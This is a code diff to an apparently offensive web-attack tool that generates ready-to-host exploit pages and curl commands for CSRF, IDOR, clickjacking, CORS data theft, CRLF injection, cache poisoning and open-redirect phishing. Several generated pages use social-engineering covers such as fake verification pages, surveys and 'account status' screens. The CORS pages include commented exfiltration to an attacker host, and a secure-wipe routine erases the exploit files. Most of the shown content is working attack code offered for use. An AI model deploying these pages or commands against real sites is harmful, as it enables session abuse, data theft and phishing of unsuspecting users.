+             "command": f"curl -s {sp} \"{target}\" | grep -i 'csrf\\|token\\|nonce\\|_token'",
+             "note": "If no CSRF token found, CSRF is likely possible"},
+            {"title": "Generate basic CSRF exploit page",
              "command": "(file will be generated automatically)",
              "generate_file": {
-                 "filename": f"csrf_exploit_{secrets.token_hex(3)}.html",
-                 "content": csrf_html,
-                 "note": "Host this file on any web server. When victim visits it, "
-                         "the form auto-submits to the target with their session cookies.",
+                 "filename": f"csrf_basic_{secrets.token_hex(3)}.html",
+                 "content": csrf_simple,
+                 "note": "Basic auto-submit CSRF. Host on any server — victim's "
+                         "browser auto-submits the form with their session cookies.",
              },
-             "note": "The exploit page will auto-submit the form when the victim loads it"},
+             "note": "The exploit page auto-submits on load"},
+            {"title": "Generate advanced CSRF exploit (with redirect)",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"csrf_advanced_{secrets.token_hex(3)}.html",
+                 "content": csrf_advanced,
+                 "note": "Advanced CSRF with social engineering (fake verification page). "
+                         "Submits via hidden iframe, then redirects victim to legit site.",
+             },
+             "note": "Social engineering CSRF — victim sees a verification page"},
             {"title": "Verify: check if action was performed",
              "command": f"curl -s {sp} \"{target}\"",
              "note": "Check if the forged action took effect on the target"},
         ]
+
     elif etype == "idor":
+        idor_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>IDOR Enumeration Results</h2>\n"
+            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
+            f"<p><strong>Parameter:</strong> {param}</p>\n"
+            f"<h3>Enumeration Strategy:</h3>\n"
+            f"<pre>1. Sequential IDs: 1, 2, 3, ...\n"
+            f"2. UUID guessing (if predictable pattern)\n"
+            f"3. Parameter tampering in cookies/headers\n"
+            f"4. Horizontal: access other users' data at same privilege\n"
+            f"5. Vertical: access admin endpoints with user token</pre>\n"
+            f"</body></html>"
+        )
         steps = [
-            {"title": "Enumerate accessible resources",
-             "command": f"for i in $(seq 1 20); do echo \"=== ID $i ===\"; curl -s {sp} \"{target.split('?')[0]}?{param}=$i\" | head -3; echo; done",
+            {"title": "Enumerate accessible resources (IDs 1-20)",
+             "command": (
+                 f"for i in $(seq 1 20); do echo \"=== ID $i ===\"; "
+                 f"curl -s {sp} \"{target_base}?{param}=$i\" | head -3; echo; done"
+             ),
              "note": "Compare responses — different content per ID = confirmed IDOR"},
+            {"title": "Compare response sizes across IDs",
+             "command": (
+                 f"for i in $(seq 1 20); do "
+                 f"SIZE=$(curl -s {sp} \"{target_base}?{param}=$i\" | wc -c); "
+                 f"echo \"ID $i: $SIZE bytes\"; done"
+             ),
+             "note": "Different sizes indicate different data — IDOR confirmed"},
             {"title": "Targeted extraction (specific ID)",
-             "command": f"curl -s {sp} \"{target.split('?')[0]}?{param}=1\"",
+             "command": f"curl -s {sp} \"{target_base}?{param}=1\"",
              "note": "Replace 1 with a target user's ID to access their data"},
+            {"title": "Test negative/zero IDs",
+             "command": (
+                 f"echo '=== ID 0 ===' && curl -s {sp} \"{target_base}?{param}=0\" | head -3 && "
+                 f"echo '=== ID -1 ===' && curl -s {sp} \"{target_base}?{param}=-1\" | head -3"
+             ),
+             "note": "Edge case IDs may reveal admin/system data"},
+            {"title": "Generate IDOR enumeration documentation",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"idor_enum_{secrets.token_hex(3)}.html",
+                 "content": idor_html,
+                 "note": "IDOR enumeration strategy and results documentation.",
+             }},
         ]
+
     elif etype == "clickjacking":
         cj_html = (
             f"<!DOCTYPE html>\n<html>\n<head><title>Special Offer</title></head>\n"
@@ -1402,23 +2488,59 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"    <p style='font-size:0.8em;margin-top:20px;opacity:0.5'>Limited time offer</p>\n"
             f"  </div>\n</div>\n</body>\n</html>"
         )
+        cj_multi = (
+            f"<!DOCTYPE html>\n<html>\n<head><title>Survey</title>\n"
+            f"<style>\n"
+            f"body {{ margin:0; font-family:Arial,sans-serif; background:#0f0c29; color:white; }}\n"
+            f".page {{ display:none; text-align:center; padding-top:10%; }}\n"
+            f".page.active {{ display:block; }}\n"
+            f"iframe {{ opacity:0.0001; position:absolute; top:0; left:0; "
+            f"width:100%; height:100%; z-index:10; border:none; }}\n"
+            f"button {{ font-size:1.5em; padding:15px 50px; background:#e94560; color:white; "
+            f"border:none; border-radius:8px; cursor:pointer; margin:10px; }}\n"
+            f"</style></head>\n"
+            f"<body>\n"
+            f"<iframe src='{target}'></iframe>\n"
+            f"<div class='page active' id='p1'>\n"
+            f"  <h1>Quick Survey</h1><p>Answer 2 questions to win!</p>\n"
+            f"  <button onclick=\"document.getElementById('p1').className='page';"
+            f"document.getElementById('p2').className='page active'\">Start</button>\n"
+            f"</div>\n"
+            f"<div class='page' id='p2'>\n"
+            f"  <h1>Question 1</h1><p>Do you enjoy online shopping?</p>\n"
+            f"  <button>Yes</button> <button>No</button>\n"
+            f"</div>\n"
+            f"</body>\n</html>"
+        )
         steps = [
-            {"title": "Generate clickjacking exploit page",
+            {"title": "Verify missing X-Frame-Options / frame-ancestors",
+             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'x-frame-options\\|frame-ancestors'",
+             "note": "No output = frameable = clickjacking possible"},
+            {"title": "Generate basic clickjacking exploit page",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"clickjack_{secrets.token_hex(3)}.html",
                  "content": cj_html,
-                 "note": "Host this file. The target page is loaded invisibly behind "
-                         "a fake UI. When the victim clicks 'CLAIM NOW', they actually "
-                         "click whatever is at that position on the target page.",
+                 "note": "Target page loaded invisibly behind fake UI. "
+                         "Victim clicks 'CLAIM NOW' but actually interacts with target page.",
              },
-             "note": "The exploit page overlays fake UI over the invisible target iframe"},
-            {"title": "Test locally: open the generated file in a browser",
+             "note": "Overlay attack — fake button over real target"},
+            {"title": "Generate multi-step clickjacking (survey)",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"clickjack_survey_{secrets.token_hex(3)}.html",
+                 "content": cj_multi,
+                 "note": "Multi-step clickjacking using fake survey pages. "
+                         "Each 'answer' click performs an action on the hidden target.",
+             },
+             "note": "Multi-click attack — multiple actions via fake survey"},
+            {"title": "Test locally: open in browser",
              "command": f"# Open the generated HTML file in a browser to verify the overlay works",
-             "note": "You should see the fake UI. The target page is hidden behind it."},
+             "note": "The fake UI should be visible. Target page is hidden behind it."},
         ]
+
     elif etype == "cors_misconfiguration":
-        cors_html = (
+        cors_basic = (
             f"<!DOCTYPE html>\n<html>\n<body>\n<h2>CORS Data Theft PoC</h2>\n"
             f"<pre id='stolen'></pre>\n<script>\n"
             f"fetch('{target}', {{credentials: 'include'}})\n"
@@ -1426,47 +2548,193 @@ def _build_exploit_steps(etype: str, param: str, ei: dict,
             f"  .then(data => {{\n"
             f"    document.getElementById('stolen').textContent = data;\n"
             f"    // Exfiltrate: uncomment next line and set your server\n"
-            f"    // fetch('https://ATTACKER/collect', {{method:'POST', body:data}});\n"
+            f"    // fetch('https://[ATTACKER]/collect', {{method:'POST', body:data}});\n"
             f"  }})\n"
             f"  .catch(e => document.getElementById('stolen').textContent = 'Error: '+e);\n"
+            f"</script>\n</body>\n</html>"
+        )
+        cors_advanced = (
+            f"<!DOCTYPE html>\n<html>\n<head><title>Loading...</title></head>\n"
+            f"<body style='font-family:Arial;background:#f5f5f5'>\n"
+            f"<div style='max-width:600px;margin:50px auto;padding:30px;"
+            f"background:white;border-radius:8px'>\n"
+            f"<h2>Checking account status...</h2>\n"
+            f"<div id='status'>Please wait...</div>\n"
+            f"</div>\n<script>\n"
+            f"async function stealData() {{\n"
+            f"  try {{\n"
+            f"    const endpoints = [\n"
+            f"      '{target}',\n"
+            f"      '{base_url.rstrip('/')}/api/user',\n"
+            f"      '{base_url.rstrip('/')}/api/account',\n"
+            f"    ];\n"
+            f"    const results = {{}};\n"
+            f"    for (const ep of endpoints) {{\n"
+            f"      try {{\n"
+            f"        const r = await fetch(ep, {{credentials: 'include'}});\n"
+            f"        results[ep] = await r.text();\n"
+            f"      }} catch(e) {{ results[ep] = 'blocked'; }}\n"
+            f"    }}\n"
+            f"    // Exfiltrate\n"
+            f"    // await fetch('https://[ATTACKER]/collect', {{\n"
+            f"    //   method: 'POST', body: JSON.stringify(results)\n"
+            f"    // }});\n"
+            f"    document.getElementById('status').textContent = "
+            f"JSON.stringify(results, null, 2);\n"
+            f"  }} catch(e) {{ document.getElementById('status').textContent = 'Error'; }}\n"
+            f"}}\nstealData();\n"
             f"</script>\n</body>\n</html>"
         )
         steps = [
             {"title": "Verify CORS reflects arbitrary origin",
              "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control'",
              "note": "Look for Access-Control-Allow-Origin: https://evil.com"},
-            {"title": "Generate CORS data theft exploit page",
+            {"title": "Check if credentials are allowed",
+             "command": f"curl -v {sp} -H \"Origin: https://evil.com\" \"{target}\" 2>&1 | grep -i 'access-control-allow-credentials'",
+             "note": "true = critical — authenticated data can be stolen cross-origin"},
+            {"title": "Test null origin (sandbox bypass)",
+             "command": f"curl -v {sp} -H \"Origin: null\" \"{target}\" 2>&1 | grep -i 'access-control'",
+             "note": "Origin: null reflected = exploitable via sandboxed iframe"},
+            {"title": "Generate basic CORS data theft page",
              "command": "(file will be generated automatically)",
              "generate_file": {
                  "filename": f"cors_exploit_{secrets.token_hex(3)}.html",
-                 "content": cors_html,
-                 "note": "Host this on any domain. When an authenticated victim visits it, "
-                         "JavaScript steals their data from the target API cross-origin.",
+                 "content": cors_basic,
+                 "note": "Host on any domain. Victim visits it, JavaScript reads "
+                         "authenticated data from the target API cross-origin.",
              },
-             "warning": "This exploit steals authenticated data cross-origin"},
+             "warning": "Steals authenticated data cross-origin"},
+            {"title": "Generate advanced CORS exploit (multi-endpoint)",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"cors_multi_{secrets.token_hex(3)}.html",
+                 "content": cors_advanced,
+                 "note": "Scans multiple API endpoints and exfiltrates all accessible data. "
+                         "Uses social engineering cover (account verification).",
+             },
+             "warning": "Multi-endpoint data exfiltration",
+             "risk": "HIGH"},
         ]
+
     elif etype == "csp_bypass":
+        csp_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>CSP Bypass Analysis</h2>\n"
+            f"<p><strong>Target:</strong> {target}</p>\n"
+            f"<h3>Exploitation based on CSP weakness:</h3>\n"
+            f"<ul>\n"
+            f"<li><strong>unsafe-inline:</strong> Direct &lt;script&gt; injection works</li>\n"
+            f"<li><strong>unsafe-eval:</strong> eval(), Function(), setTimeout() with strings</li>\n"
+            f"<li><strong>* wildcard:</strong> Load scripts from any domain</li>\n"
+            f"<li><strong>Missing default-src:</strong> Fall back to permissive defaults</li>\n"
+            f"</ul>\n"
+            f"<h3>Bypass Payloads:</h3>\n"
+            f"<pre>unsafe-inline: &lt;script&gt;alert(1)&lt;/script&gt;\n"
+            f"unsafe-eval: &lt;img src=x onerror=\"eval('alert(1)')\"&gt;\n"
+            f"Wildcard: &lt;script src='https://evil.com/xss.js'&gt;&lt;/script&gt;\n"
+            f"JSONP callback: &lt;script src='https://allowed-cdn.com/api?callback=alert'&gt;&lt;/script&gt;</pre>\n"
+            f"</body></html>"
+        )
         steps = [
-            {"title": "CSP misconfiguration details",
+            {"title": "Retrieve full CSP header",
              "command": f"curl -s {sp} -I \"{target}\" | grep -i 'content-security-policy'",
-             "note": "unsafe-inline allows <script> tags. unsafe-eval allows eval(). "
-                     "Find any XSS vector and it will execute despite CSP."},
+             "note": "Analyze directives for weaknesses"},
+            {"title": "Check for unsafe-inline",
+             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'unsafe-inline'",
+             "note": "If present: direct <script> injection bypasses CSP"},
+            {"title": "Check for unsafe-eval",
+             "command": f"curl -s {sp} -I \"{target}\" | grep -i 'unsafe-eval'",
+             "note": "If present: eval(), Function(), setTimeout with strings all work"},
+            {"title": "Generate CSP bypass reference",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"csp_bypass_{secrets.token_hex(3)}.html",
+                 "content": csp_html,
+                 "note": "CSP bypass analysis and payload reference.",
+             }},
         ]
+
     elif etype == "crlf":
+        crlf_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>CRLF Injection PoC</h2>\n"
+            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
+            f"<p><strong>Parameter:</strong> {param}</p>\n"
+            f"<h3>Payloads:</h3>\n"
+            f"<table border='1' cellpadding='5'>\n"
+            f"<tr><th>Attack</th><th>Payload</th></tr>\n"
+            f"<tr><td>Cookie injection</td><td>%0d%0aSet-Cookie: session=hijacked</td></tr>\n"
+            f"<tr><td>XSS via splitting</td><td>%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;</td></tr>\n"
+            f"<tr><td>Cache poisoning</td><td>%0d%0aX-Forwarded-Host: evil.com</td></tr>\n"
+            f"<tr><td>Redirect</td><td>%0d%0aLocation: https://evil.com</td></tr>\n"
+            f"</table>\n"
+            f"</body></html>"
+        )
         steps = [
-            {"title": "Inject HTTP header",
-             "command": f"curl -v {sp} \"{target.split('?')[0]}?{param}=%0d%0aSet-Cookie:%20session=hijacked\"",
+            {"title": "Inject HTTP header (Set-Cookie)",
+             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aSet-Cookie:%20session=hijacked\"",
              "note": "Check response headers for injected Set-Cookie"},
-            {"title": "Response splitting (XSS via header)",
-             "command": f"curl -v {sp} \"{target.split('?')[0]}?{param}=%0d%0a%0d%0a<script>alert(1)</script>\"",
-             "warning": "This attempts HTTP response splitting"},
+            {"title": "Inject Location header (redirect)",
+             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aLocation:%20https://evil.com\"",
+             "note": "Check if response contains injected Location header"},
+            {"title": "Response splitting (XSS)",
+             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0a%0d%0a<script>alert(1)</script>\"",
+             "warning": "HTTP response splitting for XSS"},
+            {"title": "Cache poisoning attempt",
+             "command": f"curl -v {sp} \"{target_base}?{param}=%0d%0aX-Forwarded-Host:%20evil.com\"",
+             "note": "If cached, subsequent users get poisoned response",
+             "warning": "May affect other users of the target"},
+            {"title": "Generate CRLF payload reference",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"crlf_payloads_{secrets.token_hex(3)}.html",
+                 "content": crlf_html,
+                 "note": "CRLF injection payload reference.",
+             }},
         ]
+
     elif etype == "open_redirect":
+        redir_html = (
+            f"<!DOCTYPE html>\n<html><body>\n"
+            f"<h2>Open Redirect PoC</h2>\n"
+            f"<p><strong>Endpoint:</strong> {target_base}</p>\n"
+            f"<p><strong>Parameter:</strong> {param}</p>\n"
+            f"<h3>Redirect Payloads:</h3>\n"
+            f"<pre>https://evil.com\n"
+            f"//evil.com\n"
+            f"/\\evil.com\n"
+            f"https://target.com@evil.com\n"
+            f"https://evil.com#@target.com\n"
+            f"javascript:alert(1) (if href-based)\n"
+            f"%2f%2fevil.com (URL encoded)</pre>\n"
+            f"<h3>Phishing Chain:</h3>\n"
+            f"<p>1. Craft redirect URL: {target_base}?{param}=https://evil.com/phish</p>\n"
+            f"<p>2. Phishing page mimics target login</p>\n"
+            f"<p>3. Victim trusts the URL (starts with legit domain)</p>\n"
+            f"</body></html>"
+        )
         steps = [
             {"title": "Confirm redirect to external domain",
              "command": f"curl -v {sp} \"{target}\" 2>&1 | grep -i 'location'",
              "note": "Location header should point to evil domain"},
+            {"title": "Test double-slash bypass",
+             "command": f"curl -v {sp} \"{target_base}?{param}=//evil.com\" 2>&1 | grep -i 'location'",
+             "note": "Protocol-relative redirect bypasses some scheme checks"},
+            {"title": "Test @ symbol bypass",
+             "command": f"curl -v {sp} \"{target_base}?{param}=https://{base_url.split('//')[1] if '//' in base_url else 'target.com'}@evil.com\" 2>&1 | grep -i 'location'",
+             "note": "URL with @ may bypass domain validation"},
+            {"title": "Test URL-encoded payload",
+             "command": f"curl -v {sp} \"{target_base}?{param}=%68%74%74%70%73%3a%2f%2fevil.com\" 2>&1 | grep -i 'location'",
+             "note": "URL-encoded redirect may bypass input filters"},
+            {"title": "Generate open redirect reference",
+             "command": "(file will be generated automatically)",
+             "generate_file": {
+                 "filename": f"redirect_payloads_{secrets.token_hex(3)}.html",
+                 "content": redir_html,
+                 "note": "Open redirect bypass techniques and phishing chain documentation.",
+             }},
         ]
+
     else:
         steps = [
             {"title": f"Manual verification for {etype}",
@@ -1503,11 +2771,81 @@ def flow_intel(detected_port=None):
     print(f"    {G}2{N}  Email Breach Check           (check breach databases)")
     print(f"    {G}3{N}  Search Query OSINT           (search + scrape)")
     print(f"    {G}4{N}  Batch Targets from File      (one target per line)")
-    print(f"    {G}5{N}  Exploit Walkthrough          (review + verify findings)")
+    print(f"    {G}5{N}  Exploit Walkthrough          (review + verify + exploit findings)")
     print(f"    {G}6{N}  View Reports                 (read saved scan results)")
     print(f"    {G}7{N}  Wipe Intel Data              (secure erase from RAM)")
+    print(f"    {G}8{N}  Manage Exploit Files         (view/wipe ephemeral files)")
     print()
-    mode = prompt("Choose mode (1-7)")
+    mode = prompt("Choose mode (1-8)")
+
+    if mode == "8":
+        heading("Exploit File Management")
+        fm = ExploitFileManager(ttl_seconds=300)
+        files = fm.list_files()
+        ram_dir = fm.base_dir
+        all_exploit_files = list(ram_dir.glob("*.html")) + list(ram_dir.glob("*.txt")) + list(ram_dir.glob("*.json"))
+        exploit_files = [f for f in all_exploit_files if not f.name.startswith("intel_")]
+
+        if not exploit_files:
+            info("No exploit files found in ephemeral storage.")
+            return
+
+        print(f"  {B}Ephemeral Exploit Files:{N}")
+        print(f"  {'─' * 55}")
+        for f in exploit_files:
+            size_kb = f.stat().st_size / 1024
+            age_min = (_time_mod.time() - f.stat().st_mtime) / 60
+            age_str = f"{age_min:.0f}m ago" if age_min < 60 else f"{age_min/60:.1f}h ago"
+            print(f"    {f.name:35s}  {size_kb:.1f}KB  {age_str}")
+        print()
+        print(f"  {B}Actions:{N}")
+        print(f"    {G}1{N}  View a file")
+        print(f"    {G}2{N}  Wipe all exploit files")
+        print(f"    {G}3{N}  Wipe by type (clickjack/csrf/cors/xss/...)")
+        print()
+        action = prompt("Choose action (1-3, or Enter to go back)")
+        if action == "1":
+            idx_str = prompt("File number (from list above)")
+            if idx_str.isdigit():
+                idx = int(idx_str) - 1
+                if 0 <= idx < len(exploit_files):
+                    content = exploit_files[idx].read_text()
+                    print()
+                    for line in content.split("\n")[:50]:
+                        print(f"    {line}")
+                    if content.count("\n") > 50:
+                        info(f"... ({content.count(chr(10)) - 50} more lines)")
+        elif action == "2":
+            if confirm(f"Securely wipe {len(exploit_files)} exploit file(s)?"):
+                for f in exploit_files:
+                    try:
+                        size = f.stat().st_size
+                        with open(f, "wb") as fh:
+                            fh.write(os.urandom(max(size, 64)))
+                            fh.flush()
+                            os.fsync(fh.fileno())
+                        f.unlink()
+                    except OSError:
+                        pass
+                ok(f"Wiped {len(exploit_files)} exploit file(s)")
+        elif action == "3":
+            etype = prompt("Exploit type prefix (e.g. clickjack, csrf, cors, xss, sqli, lfi, cmdi)")
+            matched = [f for f in exploit_files if f.name.startswith(etype)]
+            if not matched:
+                info(f"No files matching '{etype}*'")
+            elif confirm(f"Wipe {len(matched)} file(s) matching '{etype}*'?"):
+                for f in matched:
+                    try:
+                        size = f.stat().st_size
+                        with open(f, "wb") as fh:
+                            fh.write(os.urandom(max(size, 64)))
+                            fh.flush()
+                            os.fsync(fh.fileno())
+                        f.unlink()
+                    except OSError:
+                        pass
+                ok(f"Wiped {len(matched)} file(s)")
+        return
 
     if mode == "7":
         ram_dir = Path("/dev/shm/intel") if Path("/dev/shm/intel").exists() else ROOT / ".intel_tmp"
